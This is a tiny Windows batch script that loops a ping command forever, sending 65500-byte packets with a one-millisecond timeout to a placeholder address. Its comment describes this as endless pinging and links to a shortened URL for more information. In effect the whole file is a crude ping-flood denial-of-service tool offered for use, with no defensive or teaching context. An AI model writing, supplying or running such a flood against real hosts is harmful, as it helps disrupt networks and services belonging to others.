:: endlessly pings an ip with an MTU length of 65500
:: check this out for more info: https://tinyurl.com/2p8bw8my

:loop

ping <ADDRESS> -l 65500 -w 1 -n 1
goto :loop